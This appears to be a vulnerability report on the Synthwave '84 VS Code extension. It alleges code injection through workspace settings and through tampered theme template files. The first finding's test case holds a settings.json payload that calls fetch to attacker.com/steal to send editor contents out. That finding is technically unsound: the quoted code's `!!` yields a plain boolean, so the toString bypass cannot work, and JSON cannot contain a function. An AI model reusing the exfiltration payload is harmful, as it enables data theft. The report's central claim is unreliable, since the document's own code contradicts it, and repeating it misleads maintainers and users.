# Vulnerabilities in Synthwave '84 VS Code Extension

## Remote Code Execution via Workspace Settings Manipulation

### Vulnerability Name
Remote Code Execution via Workspace Settings Manipulation

### Description
The Synthwave '84 VS Code extension processes user configuration from workspace settings without sufficient validation when enabling the "Neon Dreams" effect. When the extension is activated and the user enables the glow effect, it reads configuration values from the workspace settings and injects them directly into a JavaScript template. A malicious repository can include a carefully crafted `.vscode/settings.json` file with values that bypass the minimal sanitization, resulting in JavaScript code execution in the VS Code context.

Step by step exploitation:
1. An attacker creates a malicious repository with a `.vscode/settings.json` file containing crafted values for `synthwave84.disableGlow`.
2. The victim with Synthwave '84 installed opens this repository in VS Code.
3. When the victim activates the "Enable Neon Dreams" command from the command palette, the extension reads the malicious workspace setting.
4. The extension performs minimal sanitization (using `!!` operator) which can be bypassed.
5. The extension substitutes the value directly into a JavaScript template without proper escaping.
6. The modified JavaScript containing the injected code is written to a file in the VS Code installation directory.
7. VS Code loads this JavaScript, executing the attacker's code in the VS Code process context.

### Impact
If successfully exploited, this vulnerability allows an attacker to execute arbitrary JavaScript code in the context of the VS Code application. This can lead to:
- Access to all files open in the editor
- Execution of commands on the victim's machine with the same permissions as VS Code
- Potential exfiltration of sensitive data from other repositories
- Installation of additional malicious extensions
- Persistence through modification of VS Code's installation files

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension attempts to sanitize the `disableGlow` value using the `!!` operator to coerce it to a boolean. However, this is insufficient to prevent code injection as JavaScript objects with custom `toString()` methods can bypass this protection.

### Missing Mitigations
- Input validation should be strengthened to ensure only primitive boolean values are accepted.
- The extension should use a safer method for template substitution that properly escapes or encodes user-provided values.
- The extension should validate the final generated JavaScript before writing it to disk.
- Consider using a sandboxed approach for applying theme effects rather than modifying VS Code core files.

### Preconditions
- The victim must have the Synthwave '84 extension installed.
- The victim must open a repository containing malicious workspace settings.
- The victim must execute the "Enable Neon Dreams" command from the command palette.

### Source Code Analysis
The vulnerability originates in the `extension.js` file:

1. The extension reads workspace settings without sufficient type validation:
```javascript
const config = vscode.workspace.getConfiguration("synthwave84");
let disableGlow = config && config.disableGlow ? !!config.disableGlow : false;
```

2. The `disableGlow` value is directly substituted into a JavaScript template:
```javascript
const jsTemplate = fs.readFileSync(__dirname +'/js/theme_template.js', 'utf-8');
const themeWithGlow = jsTemplate.replace(/\[DISABLE_GLOW\]/g, disableGlow);
```

3. In `theme_template.js`, the placeholder appears in function calls:
```javascript
initNeonDreams([DISABLE_GLOW]);
```

4. If the attacker provides an object with a custom `toString()` method in the workspace settings instead of a primitive boolean value, the string replacement will call this method, allowing code injection.

5. The modified JavaScript is then written to a file and loaded by VS Code:
```javascript
fs.writeFileSync(templateFile, finalTheme, "utf-8");
output = html.replace(/\<\/html\>/g, `<!-- SYNTHWAVE 84 --><script src="neondreams.js"></script><!-- NEON DREAMS -->\n`);
```

### Security Test Case
1. Create a malicious repository with a `.vscode/settings.json` file containing:
```json
{
  "synthwave84.disableGlow": {
    "toString": function() { 
      return "false; const malicious = new Function('return fetch(\\'https://attacker.com/steal\\', {method: \\'POST\\', body: JSON.stringify({data: document.body.innerHTML})})'); malicious(); //"; 
    }
  }
}
```

2. Share this repository with the target user who has the Synthwave '84 extension installed.

3. When the victim opens the repository and activates the "Enable Neon Dreams" feature from the command palette, the extension will:
   - Read the malicious workspace setting
   - Replace the `[DISABLE_GLOW]` placeholder with the result of calling `toString()` on the object
   - Write the resulting JavaScript to a file
   - Modify VS Code's HTML to load this script

4. Upon VS Code reloading, the injected malicious code will execute, sending the contents of the editor to the attacker's server.

5. To verify successful exploitation without actually exfiltrating data, replace the payload with a simple `alert('Code execution successful')` and check if the alert appears after VS Code reloads.

## Arbitrary Code Injection via Manipulated Theme Template Files

### Vulnerability Name
Arbitrary Code Injection via Manipulated Theme Template Files

### Description
The SynthWave '84 extension reads its JavaScript theme template and CSS files from fixed paths (e.g., `/code/src/js/theme_template.js` and `/code/css/editor_chrome.css`) without any integrity verification or sanitization. A threat actor who supplies a manipulated (malicious) repository can modify these files to include arbitrary JavaScript payloads. When a victim installs the extension from this manipulated repository and executes the "Enable Neon Dreams" command (registered as `synthwave84.enableNeon`), the extension performs token replacements on the unsanitized files and writes the result to a file (`neondreams.js`) inside the VS Code installation directory (in the host's workbench folder). VS Code then loads and executes this file during startup, resulting in remote code (JavaScript) execution under the context of VS Code.

### Impact
Successful exploitation allows an attacker to run arbitrary code inside the victim's editor process, potentially leading to full compromise of the VS Code environment, leakage of sensitive information, or further system compromise. Given that VS Code may run with elevated privileges (especially on Windows), the impact could extend beyond the editor itself.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
**None.**  
The extension currently does not perform any validation, integrity checking, or digital signature verification on the files it loads from disk.

### Missing Mitigations
- Verification of file integrity through checksums or digital signatures before processing the file content.  
- Validation and sanitization of the contents of the template and CSS files prior to performing token replacement.  
- Secure packaging and distribution processes that prevent supply chain manipulation (e.g., packaging from a trusted build server).

### Preconditions
- The victim downloads or installs a manipulated version of the repository—i.e. one whose contents have been altered by a threat actor.  
- The victim executes the "synthwave84.enableNeon" command, thereby triggering the file read–modify–write cycle.  
- The VS Code installation directory is writable (e.g., the victim runs VS Code with administrative privileges or the installation is in a user-writable location).

### Source Code Analysis
- In `/code/src/extension.js`, the `activate` function registers the command `synthwave84.enableNeon`. When executed, it does the following:
  - **File Reads**:  
    - Reads theme styling from `__dirname + '/css/editor_chrome.css'` using `fs.readFileSync(..., 'utf-8')`.  
    - Reads theme JavaScript template from `__dirname + '/js/theme_template.js'` using `fs.readFileSync(..., 'utf-8')`.
  - **Token Replacement**:  
    - It replaces placeholder tokens (`[DISABLE_GLOW]`, `[CHROME_STYLES]`, `[NEON_BRIGHTNESS]`) in the template using simple string replacement methods without validating the original content.
  - **File Write and Injection**:  
    - Writes the resulting `finalTheme` string to a file (named `neondreams.js`) within the VS Code internal directory.  
    - Modifies `workbench.html` to include a `<script>` tag referencing `neondreams.js`.  
    - Upon restart, VS Code executes this script, which now contains any malicious payload if the theme template was manipulated.
- In `/code/src/js/theme_template.js`, the unsanitized token placeholders are expected to be replaced with controlled values. However, if an attacker has tampered with this file, they can embed arbitrary JavaScript prior to, during, or after these tokens.

### Security Test Case
1. **Preparation**:  
   - Create a modified version of the repository in which the file `/code/src/js/theme_template.js` contains injected JavaScript code (for example, code that sends an HTTP request to an attacker-controlled server or opens a reverse shell).  
   - Optionally, modify `/code/css/editor_chrome.css` to include extraneous payload code if desired.
2. **Installation**:  
   - Package and install the manipulated extension into VS Code (simulate a supply chain attack by hosting the manipulated repository).
3. **Triggering the Vulnerability**:  
   - Open VS Code and use the command palette to invoke the command `synthwave84.enableNeon`.  
   - This will force the extension to read the manipulated files, perform token replacement, and write out the malicious `neondreams.js` file into VS Code's workbench directory.
4. **Verification**:  
   - Check the modified `workbench.html` file to ensure it now includes a `<script>` tag for `neondreams.js`.
   - Open the `neondreams.js` file in the VS Code installation directory and verify that the attacker's payload is present.
5. **Execution and Impact Assessment**:  
   - Restart VS Code to trigger the execution of `neondreams.js`.  
   - Monitor for execution of the injected payload (e.g., network calls, reverse shell initiation, or creation of files indicating compromise).
6. **Documentation**:  
   - Log all observations and, if the malicious payload executes as intended, confirm that arbitrary code execution is achieved.